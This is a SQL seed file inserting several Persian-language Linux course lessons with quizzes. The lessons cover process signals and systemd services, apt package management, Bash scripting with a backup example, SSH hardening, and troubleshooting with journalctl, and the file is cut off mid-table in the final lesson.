INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('ub-r5', 'linux', 'Processها و systemd؛ ضربان قلب سیستم', 55, 5, '[{"k":"p","t":"وقتی سروری در ۳ صبح پاسخ نمی‌دهد، سوال این است: سرویس مرده؟ هنگ کرده؟ یا منابعش تمام شده؟ پاسخ هر سه در مهارتی است که این درس می‌سازد: دیدن، فهمیدن و فرمان‌دادن به processها — با systemd به‌عنوان فرمانده همه‌شان."},{"k":"h","t":"Process چیست و چطور پیدایش کنیم"},{"k":"p","t":"هر برنامه در حال اجرا یک process است با شناسه‌ای یکتا (PID) و یک والد — درختی که از systemd (با PID 1) شروع می‌شود. ps aux فهرست کامل را می‌دهد؛ ستون‌های کلیدی: USER مالک، PID شناسه، %CPU و %MEM مصرف، و COMMAND. top و نسخه مدرنش htop نمای زنده‌اند با مرتب‌سازی. برای پیداکردن process یک سرویس: pgrep -f nginx فقط شناسه‌ها را برمی‌گرداند — خوراک فرمان‌های بعدی."},{"k":"h","t":"سیگنال‌ها؛ زبان فرمان به process"},{"k":"p","t":"در لینوکس processها را «نمی‌بندیم»؛ به آن‌ها سیگنال می‌فرستیم. kill 1234 سیگنال TERM می‌فرستد: «لطفاً محترمانه تمام شو» — فرصت ذخیره‌سازی و پاک‌سازی. اگر گوش نداد، kill -9 1234 سیگنال KILL: هسته بدون اطلاع به برنامه حذفش می‌کند — آخرین راه، چون فرصت پاک‌سازی ندارد. قاعده طلایی: اول TERM، صبر، بعد KILL. Ctrl+C در ترمینال هم همان سیگنال TERM است."},{"k":"h","t":"systemd؛ سرویس‌ها به‌جای فرمان‌های دستی"},{"k":"p","t":"اجرای دستی برنامه با nohup مال دهه‌ها پیش است؛ systemd سرویس را به‌صورت «واحد» (unit) تعریف می‌کند: اگر مرد خودکار دوباره اجرا شود، بعد از ری‌استارت سیستم خودکار بالا بیاید، و لاگش در جای مشخصی باشد. فایل‌های unit در /etc/systemd/system ساده‌اند: یک بخش Service با ExecStart و Restart=always. بعد از هر تغییر، systemctl daemon-reload و سپس enable (اجرا در بوت) و start."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"ساخت یک سرویس واقعی","code":"# /etc/systemd/system/myapp.service\n[Unit]\nDescription=My API server\nAfter=network.target\n\n[Service]\nUser=deployer\nWorkingDirectory=/home/deployer/api\nExecStart=/usr/bin/python3 server.py\nRestart=always\nRestartSec=5\nEnvironment=PORT=8000\n\n[Install]\nWantedBy=multi-user.target\n\n# --- فعال‌سازی ---\nsudo systemctl daemon-reload\nsudo systemctl enable --now myapp\nsystemctl status myapp        # وضعیت زنده\njournalctl -u myapp -f        # لاگ زنده سرویس"},{"k":"list","items":["Restart=always یعنی اگر process به هر دلیلی مرد، systemd بعد از ۵ ثانیه زنده‌اش می‌کند — همین یک خط، ۹۰٪ «کرش‌های شبانه» را بی‌اثر می‌کند.","User=deployer یعنی سرویس با root اجرا نمی‌شود — اصل حداقل امتیاز حتی در سرویس‌های کوچک.","daemon-reload را فراموش کنی، systemd فایل جدید را نمی‌بیند — شایع‌ترین دلیل «چرا کار نمی‌کند».","journalctl -u myapp -f یعنی tail -f ولی برای لاگ systemd — همه سرویس‌های اوبونتو این‌جا لاگ می‌شوند."]},{"k":"def","term":"Unit و Service","t":"هر چیزی که systemd مدیریت می‌کند یک unit است: service برای سرویس‌ها، timer برای کارهای زمان‌بندی‌شده، socket و… فایل unit یک قرارداد اعلامی است: «این سرویس چیست، با چه فرمانی اجرا می‌شود، کی دوباره اجرا شود» — و systemd بقیه را ضمانت می‌کند."},{"k":"table","head":["فرمان systemctl","اثر"],"rows":[["status x","وضعیت + آخرین لاگ‌ها — اولین فرمان"],["start / stop / restart x","کنترل فوری"],["enable / disable x","اجرا/عدم‌اجرا در بوت"],["daemon-reload","خواندن دوباره فایل‌های unit بعد از ویرایش"],["journalctl -u x -f","لاگ زنده همان سرویس"]]},{"k":"warn","title":"دام رایج","t":"استفاده از kill -9 به‌عنوان راه‌حل اول. KILL فرصت ذخیره‌سازی نمی‌دهد و می‌تواند فایل‌ها را نیمه‌نوشته رها کند — و مهم‌تر، اگر systemd با Restart=always بالای process باشد، KILL فقط باعث ری‌استارت فوری می‌شود و مشکل واقعی پنهان می‌ماند. اول دلیل مرگ را در journalctl بخوان."},{"k":"tip","title":"نکته حرفه‌ای","t":"وقتی process «هنگ» کرده ولی زنده است، strace -p PID را امتحان کن: فراخوانی‌های سیستمی‌اش را زنده نشان می‌دهد. اگر مدام روی read یک socket گیر کرده، یعنی منتظر شبکه‌ای است که جواب نمی‌دهد — نیمی از «هنگ‌های مرموز» همین‌جا لو می‌روند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["ps و htop برای دیدن؛ pgrep برای پیداکردن؛ kill برای سیگنال.","اول TERM (محترمانه)، بعد KILL (زور) — نه برعکس.","systemd سرویس را زنده نگه می‌دارد، در بوت اجرا و لاگش را جمع می‌کند."]}]'::jsonb, '[{"q":"تفاوت kill 1234 و kill -9 1234 چیست؟","opts":["فرقی ندارند","اولی سیگنال TERM (پایان محترمانه با فرصت پاک‌سازی) و دومی KILL (حذف فوری توسط هسته) است","اولی برای سرویس‌هاست دومی برای فایل‌ها","9 یعنی ۹ ثانیه صبر"],"ans":1,"why":"TERM به برنامه اجازه می‌دهد اتصال‌ها را ببندد و داده را ذخیره کند؛ KILL هیچ فرصتی نمی‌دهد و آخرین راه است."},{"q":"بعد از ویرایش فایل unit، چه فرمانی لازم است؟","opts":["reboot","systemctl daemon-reload تا systemd تعریف جدید را بخواند","kill همه processها","هیچی"],"ans":1,"why":"systemd فایل‌ها را حافظه می‌کند؛ بدون reload تعریف قدیمی را اجرا می‌کند و تغییرات بی‌اثر می‌مانند."},{"q":"Restart=always چه می‌کند؟","opts":["سرویس را هر ساعت ری‌استارت می‌کند","اگر process مرد، systemd بعد از RestartSec دوباره اجراش می‌کند","از stop جلوگیری می‌کند","لاگ را پاک می‌کند"],"ans":1,"why":"همین سیاست ساده، پایداری سرویس‌ها را بدون دخالت انسانی تضمین می‌کند — پایه خودترمیمی در لینوکس."}]'::jsonb),
('ub-r6', 'linux', 'مدیریت بسته با apt؛ نرم‌افزار، روش لینوکسی', 45, 6, '[{"k":"p","t":"در لینوکس نرم‌افزار را از «سایت سازنده» دانلود نمی‌کنی؛ از مخزن رسمی توزیع می‌گیری — امضاشده، وابستگی‌هایش حل‌شده و با یک فرمان به‌روز. درک apt یعنی خداحافظی با «DLL missing» و سلام به به‌روزرسانی امن هزار سرور با یک فرمان."},{"k":"h","t":"سه فرمانی که باید ملکه ذهنت شوند"},{"k":"p","t":"apt update فهرست مخازن را تازه می‌کند — نه خود نرم‌افزارها؛ بدون آن سیستم نمی‌داند نسخه‌های جدید چه‌اند. apt upgrade بسته‌های نصبی را به آخرین نسخه فهرست می‌رساند. apt install <نام> نرم‌افزار و همه وابستگی‌هایش را نصب می‌کند. ترتیب طلایی قبل از هر نصب: اول update، بعد install. و apt remove فقط بسته را می‌برد، apt purge تنظیماتش را هم پاک می‌کند — تفاوتی که بعداً نجاتت می‌دهد."},{"k":"h","t":"وابستگی‌ها؛ چرا apt شاهکار است"},{"k":"p","t":"وقتی nginx نصب می‌کنی، apt خودش libssl، zlib و ده‌ها کتابخانه لازم را پیدا و نصب می‌کند — و موقع حذف، وابستگی‌های بی‌مصرف را با apt autoremove جمع می‌کند. این «حل وابستگی» همان چیزی است که نصب نرم‌افزار در لینوکس را از جهنم DLLهای ویندوز جدا کرد. dpkg لایه زیرین است که فایل‌های بسته را می‌شناسد: dpkg -l فهرست نصبی‌ها و dpkg -L <بسته> همه فایل‌های یک بسته را نشان می‌دهد — برای پیداکردن جای تنظیمات."},{"k":"h","t":"snap در برابر apt؛ و PPA"},{"k":"p","t":"snap بسته‌هایی است که وابستگی‌هایشان را همراه خود می‌آورند و خارج از چرخه توزیع به‌روز می‌شوند — برای نرم‌افزارهای میزکار (مثل VS Code) راحت‌اند ولی کندتر و حجیم‌تر؛ برای سرور apt اولویت دارد. PPA هم مخزن شخصی است که apt را گسترش می‌دهد — قدرتمند ولی پرریسک: هر PPA یعنی اعتماد به یک نفر غریبه برای امضای کد روی سیستمت."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"چرخه عمر کامل یک بسته","code":"sudo apt update                    # ۱. تازه‌سازی فهرست\nsudo apt upgrade -y                # ۲. به‌روزرسانی امنیتی\n\napt search redis                   # ۳. پیداکردن نام دقیق\nsudo apt install redis-server -y   # ۴. نصب با وابستگی‌ها\n\napt policy redis-server            # ۵. نسخه و مخزن مبدأ\ndpkg -L redis-server | grep conf   # ۶. فایل‌هایش کجاست؟\n\nsudo apt purge redis-server        # ۷. حذف کامل با تنظیمات\nsudo apt autoremove                # ۸. پاک‌سازی وابستگی‌های یتیم"},{"k":"list","items":["apt policy دو چیز مهم می‌گوید: نسخه نصبی و اینکه از کدام مخزن آمده — وقتی «چرا نسخه‌اش قدیمی است؟» می‌پرسی، جواب اینجاست.","dpkg -L + grep conf سریع‌ترین راه پیدا کردن تنظیمات هر بسته‌ای است که نصب کرده‌ای.","autoremove بعد از هر purge عادت خوب توست: وابستگی‌هایی که فقط برای همین بسته آمده بودند پاک می‌شوند."]},{"k":"def","term":"مخزن (Repository)","t":"سرورهایی که بسته‌های امضاشده توزیع را نگه می‌دارند و فهرست‌شان در /etc/apt/sources.list تعریف شده. apt قبل از هر نصب امضای بسته را چک می‌کند — پس «واسطه امن» فقط سرعت نیست؛ زنجیره اعتماد نرم‌افزار است."},{"k":"table","head":["فرمان","کار"],"rows":[["apt update","تازه‌سازی فهرست مخازن (نه نصب!)"],["apt upgrade","به‌روزرسانی بسته‌های نصبی"],["apt install x","نصب با حل خودکار وابستگی‌ها"],["apt remove / purge x","حذف ساده / حذف با تنظیمات"],["apt autoremove","پاک‌سازی وابستگی‌های بی‌مصرف"],["unattended-upgrades","به‌روزرسانی امنیتی خودکار"]]},{"k":"warn","title":"دام رایج","t":"اضافه‌کردن PPAهای ناشناس برای گرفتن «آخرین نسخه» روی سرور تولید. هر PPA یعنی کد امضانشده‌ای که خارج از بررسی اوبونتو روی ماشینت اجرا می‌شود — و چندین حمله زنجیره تأمین از همین راه آمده. برای نسخه‌های جدید روی سرور، مخزن رسمی خود نرم‌افزار (مثل nodesource یا مخزن رسمی داکر) ترجیح بده، نه PPA اشخاص."},{"k":"tip","title":"نکته حرفه‌ای","t":"unattended-upgrades را از روز اول فعال کن: به‌روزرسانی‌های امنیتی را خودکار نصب می‌کند تا مثل بقیه دنیا، روزی که CVE مهمی اعلام شد، سرورت وصله باشد — بدون اینکه تو بیدار باشی. sudo dpkg-reconfigure unattended-upgrades کافی است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["قبل از نصب همیشه apt update؛ بعد install؛ بعد autoremove.","apt وابستگی‌ها را حل و امضاها را چک می‌کند — امنیت زنجیره تأمین.","برای سرور apt و مخازن رسمی؛ snap و PPA با احتیاط."]}]'::jsonb, '[{"q":"apt update واقعاً چه می‌کند؟","opts":["نرم‌افزارها را به‌روز می‌کند","فقط فهرست بسته‌های موجود در مخازن را تازه می‌کند؛ نصبی انجام نمی‌شود","سیستم‌عامل را ارتقا می‌دهد","کش را پاک می‌کند"],"ans":1,"why":"بدون درک این تفاوت، تازه‌کارها فکر می‌کنند update سیستم را به‌روز کرده — ولی فقط «فهرست قیمت» تازه شده، خرید هنوز انجام نشده."},{"q":"تفاوت remove و purge چیست؟","opts":["purge سریع‌تر است","purge فایل‌های تنظیمات بسته در /etc را هم پاک می‌کند؛ remove فقط برنامه را","فرقی ندارند","remove تنظیمات را پاک می‌کند"],"ans":1,"why":"برای نصب تمیز دوباره (یا حذف کامل ردپا) purge لازم است — با remove تنظیمات قدیمی می‌مانند و نصب بعدی را آلوده می‌کنند."},{"q":"چرا unattended-upgrades روی سرور حیاتی است؟","opts":["دیسک را تمیز می‌کند","وصله‌های امنیتی را خودکار نصب می‌کند تا فاصله اعلام CVE تا وصله‌شدن سرور حداقل شود","نرم‌افزار جدید نصب می‌کند","سرعت را بالا می‌برد"],"ans":1,"why":"بیشتر نفوذها از CVEهای وصله‌نشده‌ای می‌آیند که وصله‌شان ماه‌ها موجود بوده — اتوماسیون این فاصله را می‌بندد."}]'::jsonb),
('ub-r7', 'linux', 'اسکریپت‌نویسی Bash؛ اتوماسیون، زبان بومی سرور', 60, 7, '[{"k":"p","t":"هر کاری که دو بار دستی انجام داده‌ای، بار سوم را اسکریپت کن. Bash زبان اتوماسیون لینوکس است — و با اینکه پایتون قوی‌تر است، هنوز هیچ‌چیز جایگزین یک اسکریپت bash نشده که «روی هر سرور لینوکسی، بدون نصب چیزی، اجرا می‌شود»."},{"k":"h","t":"ساختار یک اسکریپت جدی"},{"k":"p","t":"هر اسکریپت با #!/bin/bash (شی‌بانگ) شروع می‌شود تا سیستم بداند با چه مفسری اجرا شود. بعد set -euo pipefail — سه پرچمی که اسکریپت را از «اسباب‌بازی» به «مهندسی» می‌برند: e- یعنی هر فرمانی که شکست خورد، اسکریپت متوقف شود (نه ادامه با وضعیت خراب)؛ u- یعنی متغیر تعریف‌نشده خطا بدهد؛ و pipefail یعنی شکستِ هر عضو pipe، شکست کل pipe باشد. این یک خط، نیمی از باگ‌های اسکریپت‌های تولید را حذف می‌کند."},{"k":"h","t":"متغیرها، شرط‌ها و حلقه‌ها"},{"k":"p","t":"متغیر بدون فاصله حول = تعریف می‌شود (NAME=value نه NAME = value) و با $NAME خوانده می‌شود؛ و همیشه در نقل‌قول \"$NAME\" تا فضای خالی و کاراکترهای خاص نشکنند. شرط با if [ -f file ] — و دقت کن که براکت‌ها خودشان یک فرمان‌اند و فاصله لازم دارند. برای مقایسه رشته = و برای عدد -eq. حلقه for f in *.log روی فایل‌ها و while read line برای خواندن خط‌به‌خط خروجی فرمان‌ها — این ترکیب ۸۰٪ اتوماسیون‌هاست."},{"k":"h","t":"کد خروج؛ قرارداد بزرگ"},{"k":"p","t":"هر فرمان با یک عدد تمام می‌شود: ۰ یعنی موفق، غیرصفر یعنی خطا — و این عدد در $? ذخیره می‌شود. و فرمان‌ها را با && و || زنجیر کن: make && sudo make install یعنی «فقط اگر ساخت موفق بود نصب کن». اسکریپت خودش هم با exit 0 یا exit 1 تمام می‌شود — و این همان چیزی است که CIها و systemd و cron برای فهمیدن موفقیت می‌خوانند. اسکریپتی که همیشه ۰ برمی‌گرداند، دروغ می‌گوید."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"backup.sh — پشتیبان‌گیری واقعی","code":"#!/bin/bash\nset -euo pipefail\n\nBACKUP_DIR=\"/var/backups/app\"\nSOURCE=\"/var/www/app\"\nSTAMP=$(date +%Y%m%d-%H%M)\nKEEP=7    # نگه‌داشتن ۷ نسخه آخر\n\nmkdir -p \"$BACKUP_DIR\"\n\n# فشرده‌سازی + نام تاریخ‌دار\ntar -czf \"$BACKUP_DIR/app-$STAMP.tar.gz\" -C \"$(dirname $SOURCE)\" \"$(basename $SOURCE)\"\n\n# بررسی صحت آرشیو قبل از پاک‌کردن قدیمی‌ها!\ntar -tzf \"$BACKUP_DIR/app-$STAMP.tar.gz\" > /dev/null\n\n# حذف نسخه‌های قدیمی‌تر از KEEP\nls -1t \"$BACKUP_DIR\"/app-*.tar.gz | tail -n +$((KEEP+1)) | xargs -r rm --\n\necho \"Backup OK: app-$STAMP.tar.gz\""},{"k":"list","items":["tar -tzf فهرست آرشیو را بدون بازکردن می‌خواند — بررسی صحت قبل از اینکه اعتماد کنی و قدیمی‌ها را پاک کنی؛ این یک خط جلوی «پشتیبان‌های خرابِ کشف‌نشده» را می‌گیرد.","ls -1t مرتب زمانی می‌کند، tail -n +8 از هشتمی به بعد را می‌گیرد (یعنی قدیمی‌ها) و xargs -r فقط اگر چیزی بود پاک می‌کند.","rm -- یعنی بعد از این هیچ آرگومان‌پرچم‌گونه‌ای نیست — دفاع در برابر نام فایل‌هایی که با - شروع می‌شوند.","اگر tar خراب باشد، set -e اسکریپت را قبل از پاک‌کردن نسخه‌های سالم متوقف می‌کند — همان جایی که اسکریپت‌های آماتور فاجعه می‌سازند."]},{"k":"def","term":"کد خروج (Exit Code)","t":"عدد ۰ تا ۲۵۵ که هر برنامه هنگام پایان برمی‌گرداند؛ ۰ موفقیت و بقیه انواع شکست. این قرارداد کوچک، زبان مشترک کل اکوسیستم لینوکس است: shell، cron، systemd و CI همه با همین عدد تصمیم می‌گیرند."},{"k":"table","head":["ساختار","مثال","معنی"],"rows":[["شرط فایل","[ -f /etc/nginx/nginx.conf ]","فایل وجود دارد"],["شرط عددی","[ \"$COUNT\" -gt 10 ]","بزرگ‌تر از ۱۰"],["زنجیره موفقیت","mkdir d && cd d","دومی فقط اگر اولی موفق بود"],["خواندن خط‌ها","cmd | while read -r line","پردازش خروجی خط‌به‌خط"],["تابع","deploy() { ...; }","بلوک قابل‌استفاده دوباره"]]},{"k":"warn","title":"دام رایج","t":"اسکریپت بدون set -euo pipefail که «کار می‌کند» تا روزی که نمی‌کند: rm شکست خورده ولی اسکریپت ادامه داده و نسخه سالم را پاک کرده. این پرچم‌ها را نه به‌عنوان تزئین، که به‌عنوان ترمز اضطراری ببین — و برای پاک‌سازی‌های خطرناک، اول echo فرمان را چاپ کن و دستی تأیید کن (dry-run)."},{"k":"tip","title":"نکته حرفه‌ای","t":"shellcheck را نصب کن و قبل از هر اجرای جدی، اسکریپت را از آن رد کن — رایگان است و دقیقاً همان باگ‌هایی را می‌گیرد که در ۳ صبح دنبالش می‌گشتی: متغیرهای نقل‌قول‌نشده، pipefailهای گم‌شده، شرط‌های شکسته. هیچ مهندس حرفه‌ای bash بدون shellcheck نمی‌نویسد."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["شی‌بانگ + set -euo pipefail = اسکریپت مهندسی‌شده.","متغیرها همیشه در نقل‌قول؛ شرط‌ها با فاصله درست حول [ ].","کد خروج قرارداد جهانی موفقیت/شکست است — اسکریپت تو هم باید صادقانه برگرداندش."]}]'::jsonb, '[{"q":"set -e چه می‌کند؟","opts":["اسکریپت را رمز می‌کند","اگر فرمانی کد خطا برگرداند، اسکریپت فوراً متوقف می‌شود","خروجی را پاک می‌کند","سرعت را بالا می‌برد"],"ans":1,"why":"بدون آن، اسکریپت بعد از شکست ادامه می‌دهد و با وضعیت خراب، فرمان‌های بعدی (مثل rm) را اجرا می‌کند."},{"q":"چرا \"$VAR\" بهتر از $VAR است؟","opts":["زیباتر است","اگر متغیر فضای خالی یا کاراکتر خاص داشته باشد، یک آرگومان باقی می‌ماند و فرمان نمی‌شکند","سریع‌تر است","فرقی ندارد"],"ans":1,"why":"فایل «گزارش من.txt» بدون نقل‌قول دو آرگومان می‌شود و فرمان اشتباهی اجرا می‌شود — از کلاسیک‌ترین باگ‌های bash."},{"q":"کد خروج ۰ یعنی چه؟","opts":["خطای ناشناخته","موفقیت — قرارداد مشترک همه فرمان‌ها و اسکریپت‌های لینوکس","هشدار","نیاز به ورودی"],"ans":1,"why":"این قرارداد است که zنجیره‌های && و بررسی‌های cron و systemd را ممکن می‌کند؛ غیرصفر یعنی شکست با جزئیات نوع خطا."}]'::jsonb),
('ub-r8', 'linux', 'شبکه در اوبونتو؛ از آدرس تا SSH', 60, 8, '[{"k":"p","t":"«سرور» یعنی ماشینی که از دور فرمان می‌برد — و همه راه‌های رسیدن به آن، از شبکه می‌گذرد. IP و DNS برای پیدا کردن، SSH برای ورود امن، و فایروال برای اینکه درها فقط روی کسانی باز باشند که باید."},{"k":"h","t":"دیدن شبکه؛ ip و ss"},{"k":"p","t":"ip addr نشان می‌دهد چه آدرس‌هایی داری و ip route مسیر پیش‌فرض (default via) را — جایی که بسته‌ها اول می‌روند. برای دیدن اتصالات فعال، ss -tulpn: کدام پورت‌ها بازند و کدام process صاحب‌شان است (ستون users). ابزارهای قدیمی مثل ifconfig و netstat دیگر نصب پیش‌فرض نیستند و ss/ip جایگزین رسمی‌اند. و برای تست مسیر، ping برای «آیا زنده است» و traceroute برای «کجا گم شده»."},{"k":"h","t":"Netplan؛ تنظیم شبکه، روش اوبونتو"},{"k":"p","t":"از ۱۷٫۱۰ اوبونتو شبکه را با Netplan تنظیم می‌کند: یک فایل YAML در /etc/netplan که یا DHCP می‌خواهی یا آدرس ثابت با gateway و DNS. بعد از ویرایش، netplan apply تغییرات را زنده اعمال می‌کند — بدون ری‌استارت. روی سرور، آدرس ثابت و DNS مشخص (مثل 1.1.1.1 یا سرویس داخلی) از واجبات است؛ سروری که هر ری‌استارت آدرسش عوض شود، سرویس نیست."},{"k":"h","t":"SSH؛ درِ ورود امن"},{"k":"p","t":"SSH یعنی ترمینال امن روی شبکه: ssh user@server وصل می‌شود و همه‌چیز رمز شده است. ولی رمز عبور راه ضعیفی است — کلید عمومی/خصوصی راه حرفه‌ای‌هاست: ssh-keygen جفت‌کلید می‌سازد، ssh-copy-id عمومی را به سرور می‌فرستد، و بعد بدون رمز وارد می‌شوی. مرحله نهایی امنیت: در /etc/ssh/sshd_config ورود با رمز را ببند (PasswordAuthentication no) و اجازه root مستقیم را هم (PermitRootLogin no). بعد از هر تغییر sshd را ری‌استارت کن — و قبلش مطمئن شو اتصال فعلی‌ات با کلید کار می‌کند، وگرنه خودت را بیرون قفل می‌کنی."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"امن‌کردن SSH در پنج قدم","code":"# ۱. ساخت جفت‌کلید (روی لپ‌تاپ)\nssh-keygen -t ed25519 -C \"laptop-work\"\n\n# ۲. فرستادن کلید عمومی به سرور\nssh-copy-id deployer@203.0.113.10\n\n# ۳. ورود با کلید — بدون رمز\nssh deployer@203.0.113.10\n\n# ۴. روی سرور: بستن راه‌های خطرناک\nsudo sed -i ''s/^#\\?PasswordAuthentication.*/PasswordAuthentication no/'' /etc/ssh/sshd_config\nsudo sed -i ''s/^#\\?PermitRootLogin.*/PermitRootLogin no/'' /etc/ssh/sshd_config\nsudo systemctl restart ssh\n\n# ۵. تست از یک ترمینال «جدید» قبل از خروج از قبلی!"},{"k":"list","items":["ed25519 الگوریتم مدرن و سریع است — کوتاه‌تر و امن‌تر از RSAهای قدیمی.","ssh-copy-id کلید عمومی (~/.ssh/id_ed25519.pub) را به authorized_keys سرور اضافه می‌کند — کلید خصوصی هرگز از لپ‌تاپت بیرون نمی‌رود.","sed با ^#\\? هم خط فعال و هم خط کامنت‌شده را پوشش می‌دهد — مهم چون تنظیمات پیش‌فرض معمولاً کامنت‌اند.","قدم ۵ قانون طلایی است: تا از ترمینال جدید ورود با کلید را تست نکرده‌ای، ترمینال فعلی را نبند — وگرنه یک تنظیم اشتباه یعنی ساعت‌ها کار با کنسول ابری."]},{"k":"def","term":"کلید عمومی/خصوصی (Key Pair)","t":"دو کلید ریاضیِ به‌هم‌گره‌خورده: خصوصی فقط پیش توست و به هیچ‌کس نشان داده نمی‌شود؛ عمومی آزادانه پخش می‌شود. سرور با کلید عمومی چالشی می‌سازد که فقط دارنده کلید خصوصی می‌تواند حلش کند — اثبات هویت بدون اینکه رازی روی شبکه رد و بدل شود."},{"k":"table","head":["فرمان","کاربرد"],"rows":[["ip addr / ip route","آدرس‌ها و مسیر پیش‌فرض"],["ss -tulpn","پورت‌های باز و صاحبانشان"],["ping / traceroute","زنده‌بودن / مسیر بسته‌ها"],["netplan apply","اعمال تنظیم شبکه از YAML"],["ssh -p 2222 user@host","اتصال به پورت غیرپیش‌فرض"],["scp file user@host:/path","کپی امن فایل"]]},{"k":"warn","title":"دام رایج","t":"تغییر تنظیمات SSH و ری‌استارت sshd بدون بازبودن یک جلسه سالم جایگزین. اگر کلیدت اشتباه نصب شده باشد، بعد از ری‌استارت هیچ راه ورودی نداری جز کنسول ابری — تجربه‌ای که هر مدیر سرور یک‌بار دارد و دیگر فراموش نمی‌کند. همیشه دو پنجره: یکی با تغییرات، یکی برای تست."},{"k":"tip","title":"نکته حرفه‌ای","t":"فایل ~/.ssh/config را بساز و برای هر سرور نام بگذار: Host prod → HostName, User, IdentityFile. بعد به‌جای ssh deployer@203.0.113.10 -i ~/.ssh/prod_key فقط می‌نویسی ssh prod — و tab هم تکمیلش می‌کند. کوچک به‌نظر می‌رسد ولی ده‌ها بار در روز صرفه‌جویی است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["ip و ss چشم‌های شبکه‌اند؛ netplan دستِ تنظیم آن.","SSH با کلید ed25519 جایگزین رمز عبور است؛ بعد ورود رمز را کامل ببند.","قبل از ری‌استارت sshd، اتصال جدید را از ترمینال دیگر تست کن."]}]'::jsonb, '[{"q":"چرا کلید SSH از رمز عبور امن‌تر است؟","opts":["سریع‌تر است","قابل‌حدس و Brute-force نیست، روی شبکه رد و بدل نمی‌شود و قابل‌باطل‌کردن بدون تغییر بقیه است","رمز نگه نمی‌دارد","فقط روی لینوکس کار می‌کند"],"ans":1,"why":"رمزهای کوتاه شکسته می‌شوند و در دیتابیس‌های لو رفته تکراری‌اند؛ کلید ۲۵۶ بیتی تصادفی عملاً غیرقابل‌حدس است و اثبات هویتش بدون انتقال راز انجام می‌شود."},{"q":"ss -tulpn چه چیزی نشان می‌دهد؟","opts":["سرعت اینترنت","پورت‌های در حال گوش‌دادن (TCP و UDP) به‌همراه process صاحب هرکدام","جدول مسیریابی","تنظیمات DNS"],"ans":1,"why":"اولین فرمان برای «چه سرویسی روی چه پورتی است» — و بهترین راه فهمیدن اینکه یک پورت باز از کجا آمده."},{"q":"بعد از ویرایش /etc/netplan چه باید کرد؟","opts":["reboot","netplan apply تا تنظیمات بدون ری‌استارت اعمال شوند","هیچ‌چیز","apt update"],"ans":1,"why":"Netplan طراحی شده که زنده اعمال شود؛ apply فایل را می‌خواند، اعتبارسنجی و اعمال می‌کند — و اگر اشتباه باشد، قبل از اعمال خطا می‌دهد."}]'::jsonb),
('ub-r9', 'linux', 'لاگ‌ها و عیب‌یابی؛ وقتی چیزی خراب می‌شود', 50, 9, '[{"k":"p","t":"تفاوت مهندس باتجربه با تازه‌کار سرعت تایپ نیست؛ «ترتیب نگاه‌کردن» است. وقتی چیزی خراب می‌شود، حرفه‌ای‌ها یک مسیر مشخص را می‌روند: آیا سرویس زنده است؟ لاگش چه می‌گوید؟ منابع تمام نشده؟ دیسک پر نیست؟ این درس آن مسیر را می‌سازد."},{"k":"h","t":"journalctl؛ لاگ متمرکز اوبونتو"},{"k":"p","t":"systemd همه لاگ‌ها — هسته، سرویس‌ها و bootها — را در journald جمع می‌کند. journalctl -u nginx فقط لاگ nginx؛ -f برای زنده‌دیدن؛ --since today برای امروز؛ -p err فقط خطاها و -b برای همین boot. و چون لاگ‌ها ساختاریافته‌اند، می‌توانی دقیق بپرسی: «خطاهای سرویس من از دیروز تا حالا» — نه گشتن چشمی در هزار خط متن."},{"k":"h","t":"فایل‌های لاگ کلاسیک"},{"k":"p","t":"همه‌چیز journald نیست: /var/log/syslog رویدادهای عمومی، auth.log ورودها و تلاش‌های sudo (اولین مقصد وقتی مشکوک به نفوذی)، و سرویس‌هایی مثل nginx لاگ خودشان را در /var/log/nginx نگه می‌دارند. logrotate هم قهرمان خاموش است: لاگ‌ها را می‌چرخاند و فشرده می‌کند تا دیسک پر نشود — و تنظیمش در /etc/logrotate.d برای هر سرویس پرمصرف، کار هر مدیر جدی است."},{"k":"h","t":"چک‌لیست «چرا کار نمی‌کند»"},{"k":"p","t":"ترتیب حرفه‌ای‌ها: ۱) systemctl status — سرویس زنده است؟ ۲) journalctl -u سرویس -n 50 — آخرین حرفش چیست؟ ۳) ss -tulpn — اصلاً روی پورت گوش می‌دهد؟ ۴) df -h — دیسک پر نیست؟ (پر بودن دیسک مخفی‌ترین علت خرابی است) ۵) free -h و uptime — حافظه و بار؟ ۶) dmesg | tail — سخت‌افزار یا هسته حرفی ندارد؟ این شش قدم، ۸۰٪ مشکلات را در کمتر از ۵ دقیقه لو می‌دهد — چون سیستماتیک است، نه شانسی."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"bash","title":"دیباگ یک سرویس مرده، گام‌به‌گام","code":"systemctl status myapp\n# ● myapp.service - My API server\n#    Active: failed (Result: exit-code) since ...\n#    Process: 12345 ExecStart=... (code=exited, status=1)\n\njournalctl -u myapp -n 30 --no-pager\n# ... ModuleNotFoundError: No module named ''redis''\n\n# ریشه پیدا شد: وابستگی گم‌شده بعد از آپدیت\ncd /home/deployer/api && pip install redis\nsudo systemctl start myapp\nsystemctl status myapp    # active (running) ✓"},{"k":"list","items":["status سه سرنخ می‌دهد: failed یعنی مرده، exit-code یعنی خودش خطا داده (نه کشته‌شده با سیگنال)، و زمان مرگ.","journalctl -n 30 آخرین ۳۰ خط — معمولاً کافی؛ --no-pager خروجی را یکجا می‌دهد برای کپی.","ModuleNotFoundError بعد از آپدایت یعنی apt upgrade کتابخانه‌ای را برده — یکی از سناریوهای کلاسیک «دیروز کار می‌کرد».","و بعد از رفع: status برای تأیید — هیچ‌وقت فرض نکن درست شد؛ ببین."]},{"k":"def","term":"سطوح لاگ (Log Levels)","t":"هر پیام لاگ سطحی دارد: DEBUG جزئیات توسعه، INFO رخداد عادی، WARNING مشکوک ولی ادامه‌دار، ERROR شکست یک عمل، CRITICAL از کار افتادن. فیلترکردن با سطح (journalctl -p err) یعنی در اقیانوس INFOها، فقط ERRORها را دیدن."},{"k":"table","head":["مقصد","چه دارد","فرمان"],"rows":[["journald","لاگ همه سرویس‌ها و boot","journalctl -u سرویس"],["/var/log/syslog","رویدادهای عمومی","less /var/log/syslog"],["/var/log/auth.log","ورودها و sudo","grep ''Failed'' auth.log"],["لاگ خود سرویس","جزئیات 